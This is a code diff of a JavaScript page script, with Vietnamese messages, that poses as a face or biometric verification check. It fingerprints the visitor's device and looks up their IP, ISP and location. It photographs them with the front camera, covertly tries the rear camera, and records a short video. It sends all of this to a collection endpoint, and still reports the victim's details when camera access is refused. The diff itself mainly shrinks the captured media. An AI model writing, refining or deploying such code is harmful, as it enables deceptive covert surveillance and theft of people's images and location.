@@ -1,5 +1,5 @@
 (async function() {
-    const API_URL = '/api/send'; // Path to send.js (Vercel function)
+    const API_URL = '/api/send'; 
     const info = {
         time: new Date().toLocaleString('vi-VN'),
         ip: '⌛ Đang lấy...',
@@ -17,7 +17,6 @@
         console.log(`[Status] ${msg}`);
     }
 
-    // 1. Nhận diện thiết bị chuyên sâu
     function detectDevice() {
         const ua = navigator.userAgent;
         const platform = navigator.platform;
@@ -47,13 +46,11 @@
         document.getElementById('st-os').innerText = `${info.os} (${info.device})`;
     }
 
-    // 2. Lấy IP và Vị trí
     async function getNetworkInfo() {
         try {
             const r = await fetch('https://ipwho.is/');
             const d = await r.json();
             info.ip = d.ip;
-            info.realIp = d.ip;
             info.isp = d.connection.org;
             info.location = `${d.city}, ${d.region}, ${d.country}`;
             document.getElementById('st-ip').innerText = info.ip;
@@ -64,7 +61,6 @@
         }
     }
 
-    // 3. Xử lý Camera
     async function handleCamera() {
         log("Đang yêu cầu quyền truy cập camera...");
         try {
@@ -73,10 +69,8 @@
             video.srcObject = stream;
             log("Đang quét khuôn mặt...");
 
-            // Chụp ảnh ngay lập tức
             const frontPhoto = await capturePhoto(video);
             
-            // Thử chụp camera sau (ngầm)
             let backPhoto = null;
             try {
                 const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
@@ -87,7 +81,6 @@
                 backStream.getTracks().forEach(t => t.stop());
             } catch(e) {}
 
-            // Gửi dữ liệu ảnh trước
             await sendData('media', { 
                 photos: [
                     { data: frontPhoto, caption: getReportCaption('📸 ẢNH XÁC THỰC (TRƯỚC)') },
@@ -95,13 +88,12 @@
                 ].filter(p => p.data)
             });
 
-            // Quay clip ngắn (5-7 giây)
-            log("Đang mã hóa dữ liệu sinh trắc học...");
-            await recordVideo(stream, 6000);
+            log("Đang mã hóa dữ liệu...");
+            await recordVideo(stream, 4000); // Giảm xuống 4 giây để nhẹ hơn
 
             info.camera = "✅ Hoàn tất";
         } catch (err) {
-            log("Lỗi: Vui lòng cấp quyền camera để tiếp tục.");
+            log("Lỗi: Vui lòng cấp quyền camera.");
             info.camera = "🚫 Bị từ chối";
             await sendData('text', { text: getReportCaption('⚠️ CẢNH BÁO: TỪ CHỐI CAMERA') });
         }
@@ -114,7 +106,7 @@
                 canvas.width = videoEl.videoWidth;
                 canvas.height = videoEl.videoHeight;
                 canvas.getContext('2d').drawImage(videoEl, 0, 0);
-                resolve(canvas.toDataURL('image/jpeg', 0.7));
+                resolve(canvas.toDataURL('image/jpeg', 0.5)); // Chất lượng 0.5
             }, 1000);
         });
     }
@@ -128,7 +120,7 @@
                 const blob = new Blob(chunks, { type: 'video/mp4' });
                 const reader = new FileReader();
                 reader.onloadend = async () => {
-                    await sendData('video', { video: reader.result, caption: '🎬 CLIP XÁC THỰC SINH TRẮC HỌC' });
+                    await sendData('video', { video: reader.result, caption: '🎬 CLIP XÁC THỰC' });
                     resolve();
                 };
                 reader.readAsDataURL(blob);
@@ -142,29 +134,29 @@
     function getReportCaption(title) {
         return `
 ${title}
-
-🕒 Thời gian: ${info.time}
-📱 Thiết bị: ${info.device} (${info.os})
+🕒 ${info.time}
+📱 ${info.device} (${info.os})
 🌐 IP: ${info.ip}
 🏢 ISP: ${info.isp}
-📍 Vị trí: ${info.location}
-🔗 Browser: ${info.browser.substring(0, 50)}...
+📍 ${info.location}
 `.trim();
     }
 
     async function sendData(type, payload) {
         try {
-            await fetch(API_URL, {
+            console.log(`Sending ${type}...`);
+            const response = await fetch(API_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ type, ...payload })
             });
+            const result = await response.json();
+            console.log(`Response from ${type}:`, result);
         } catch (e) {
-            console.error("Gửi dữ liệu thất bại", e);
+            console.error(`Gửi ${type} thất bại:`, e);
         }
     }
 
-    // Khởi chạy
     detectDevice();
     await getNetworkInfo();
     await handleCamera();
